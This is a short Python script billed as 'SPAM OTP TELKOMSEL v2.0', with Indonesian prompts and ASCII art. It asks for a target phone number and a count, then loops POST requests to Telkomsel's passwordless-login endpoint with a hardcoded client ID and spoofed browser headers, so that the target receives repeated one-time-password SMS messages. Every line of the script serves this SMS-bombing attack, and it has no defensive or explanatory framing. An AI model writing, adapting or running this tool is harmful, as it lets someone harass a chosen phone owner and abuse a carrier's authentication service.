#!usr/bin/python3.7

try:
	import requests,os,time,sys
	os.system('clear')
	print("""
\t ..::SPAM OTP TELKOMSEL v2.0::..
\t         .   :   .  "
\t     '.   .  :  .   .' "
\t   ._   '._.-'''-._.'   _. "
\t     '-..'         '..-'  "
\t  --._ /.==.     .==.\ _.-- "
\t 
\t      ;/_o__\ ^ /_o__\; "
\t -----|'     ) (     '|-----"
\t
\t     _: \_) (\_/) (_/ ;_ "
\t
\t  --'  \  '._.=._.'  /  '-- "
\t    _.-''.  '._.'  .''-._ "
\t   '    .''-.(_).-''.    ' "
\t      .'   '  :  '   '. "
\t         '    :   ' "
\t             ' "

[EX] +62""")
	no=input("[?] No target: ")
	jml=int(input("[?] Jumlah: "))
	input("[!] Apakah Nomor: "+no+" Sudah Benar? [Enter]")
	print()
	header = {'Auth0-Client':'eyJuYW1lIjoiYXV0aDAuanMiLCJ2ZXJzaW9uIjoiNy42LjEifQ',
	'Origin':'https://my.telkomsel.com',
	'Accept-Encoding':'gzip, deflate, br',
	'Accept-Language':'en-US,en;q=0.9',
	'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36',
	'Content-Type':'application/x-www-form-urlencoded',
	'Accept':'application/json, text/javascripte',
	'Referer':'https://my.telkomsel.com/',
	'Connection':'keep-alive'}
	dat={'client_id':'Xlj9pkfK6yYumf6G8KE2S5TDWgTtczb0','phone_number':no,'connection':'sms'}
	c=int(0)
	while c < jml:
		c+=1
		atc=requests.post("https://tdwidm.telkomsel.com/passwordless/start",data=dat,headers=header)
#		print(atc.text)
		if atc.status_code == 200:
			print("["+str(c)+"] BERHASIL! Mengirim Pesan Ke "+no)
			time.sleep(0.5)
		else:
			print("[-] GAGAL! Mengirim Pesan Ke "+no)
			print("[!] sleep 60s")
			c-=1
			time.sleep(60)

except KeyboardInterrupt: exit("[Exit] key interrupt")
except Exception as F:
	print("[Err] %s"%(F))
